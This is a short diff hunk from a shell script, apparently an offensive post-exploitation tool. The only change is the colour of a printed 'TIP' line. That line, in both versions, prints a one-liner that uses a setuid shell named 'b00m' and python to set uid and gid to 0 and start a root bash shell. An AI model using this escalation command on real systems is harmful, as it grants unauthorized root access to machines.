@@ -497,7 +497,7 @@ lootlight() {
             echo -e "${CB}B00M-SHELL ${CDY}${CF}"
             echo "${str}"
             echo -en "${CN}"
-            echo -e "${CDW}TIP: ${CDC}"'./b00m -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
+            echo -e "${CW}TIP: ${CDC}"'./b00m -p -c "exec python3 -c \"import os;os.setuid(0);os.setgid(0);os.execl('"'"'/bin/bash'"'"', '"'"'-bash'"'"')\""'"${CN}"
         }
     }
 
